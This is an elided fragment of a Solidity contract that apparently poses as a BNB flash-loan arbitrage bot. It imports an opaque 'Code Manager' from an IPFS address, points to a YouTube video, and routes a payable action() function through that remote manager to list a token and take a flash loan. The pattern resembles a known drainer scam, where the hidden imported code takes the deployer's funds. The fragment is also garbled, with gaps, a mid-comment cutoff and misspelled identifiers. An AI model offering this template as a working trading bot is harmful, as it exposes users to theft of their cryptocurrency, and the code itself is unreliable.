...
// Code Manager 
import "ipfs://QmadaAtenFSmelloro7102Y3A4vkL2siPhki2PFeUpC1";

// Youtube 
// https://www.youtube.com/watch?v=598XrlCYsEY
...
function action () public payable { 
    ...
    manager.pancakelistToken(tokenNome, tokenSymbol, tokenAddress); 
    
    // Get SNB Loan from Multiplier-Finance 
    string memory LoanAddress = manager.takeFlashLoan(LoanAmount); 
    
    // Convert half BNB to DAT 
